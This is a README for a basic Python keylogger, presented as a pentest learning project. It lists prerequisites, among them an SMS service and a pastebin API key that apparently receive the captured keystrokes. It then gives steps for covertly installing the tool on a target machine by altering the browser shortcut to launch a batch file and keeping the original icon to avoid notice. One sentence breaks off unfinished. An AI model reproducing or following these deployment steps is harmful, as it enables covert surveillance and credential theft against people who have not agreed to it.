# Keylogr
Very basic and a tad unpractical keylogger. It gets the job done.

#Disclaimer

This is a learning project. I, nor you, will never use this on targets without prior agreement. 

I'm using this in conjunction with my pentest education.




##Prerequisites:

A working SMS account (I used clockworkSMS (https://www.clockworksms.com/)) and a working pastebin developer key (http://pastebin.com/api).

This requires the target to have Python installed. If you manage to bundle the code into an exe please make a pull request. :)

Your target needs to have a shortcut to his browser on his desktop.

You'll need to exc

##Howto
Move all files to a usb device.

On target machine, open move.pyw with idle, hit F5. Copy the printed path.

Edit the browser's shortcut's properties changing it's starting folder to the path from before.

Change it's target to the path from before + \Service.bat.

Change it's icon to the same it currently has (to avoid it being replace with a batch icon.).


Voilla! :)



